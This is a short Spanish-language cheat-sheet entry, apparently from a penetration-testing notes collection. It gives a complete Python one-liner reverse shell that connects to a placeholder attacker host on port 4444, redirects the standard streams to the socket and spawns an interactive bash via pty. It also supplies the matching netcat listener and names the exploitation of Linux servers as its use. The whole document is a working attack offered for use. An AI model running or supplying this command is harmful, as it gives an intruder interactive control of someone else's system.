# Python Reverse Shell — PTY

## Descripción

Esta reverse shell utiliza el módulo **pty** para generar una shell interactiva más estable dentro de la conexión remota.

Esto permite mejorar la interacción con el sistema comprometido.

---

# Comando

```bash
python3 -c 'import socket,pty,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

---

# Listener

```bash
nc -lvnp 4444
```

---

# Requisitos

* Python
* soporte para módulo pty
* shell bash disponible

---

# Explicación

```
socket.socket()        → conexión TCP
os.dup2()              → redirección de flujos
pty.spawn()            → shell interactiva
```

---

# Cuándo usarlo

* cuando se necesita una shell interactiva estable
* explotación de servidores Linux

---

# Limitaciones

* requiere módulo pty
* no disponible en todos los entornos
